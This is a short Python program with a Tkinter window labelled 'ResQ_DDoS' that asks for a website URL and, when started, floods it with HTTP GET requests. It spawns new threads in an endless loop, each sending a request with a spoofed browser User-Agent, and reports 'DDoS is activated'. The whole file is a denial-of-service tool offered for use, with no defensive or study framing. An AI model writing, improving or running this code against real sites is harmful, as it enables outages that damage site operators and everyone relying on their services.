from tkinter import *
from tkinter import messagebox
from requests import get
from threading import Thread
cc = 0
def getreq(url):
	global cc 
	cc += 1
	get(url, headers={'User-Agent':'Mozilla/5.0'})
	print('hited ',cc)
def start_ddos(url):
	while True:
		th = Thread(target=getreq, args=(url,))
		th.start()
		
def printer(event):
	if mess.get().strip() == '':
		messagebox.showinfo('DDoS', 'Enter any site')
	else:
		print('One hit')
		start_ddos(mess.get())
		messagebox.showinfo('DDoS ','DDoS is activated')
root = Tk()
mess = StringVar()
root.title('ResQ_DDoS')
root.geometry('300x400')
lab = Label(root, text='ResQ_DDoS')
lab2 = Label(root, text='URL: ')
lab.config(font=("Courier", 20))
ent = Entry(root, width=20, bd=1, textvariable=mess)
img = PhotoImage(file='index.png')

labs = Label(image=img)
lab.pack()

labs.pack()
lab2.config(font=('Courier', 14))
lab2.pack()
ent.pack()
but = Button(root, text='start', command=printer)
but.bind('<Button-1>', printer)
but.pack()

root.mainloop()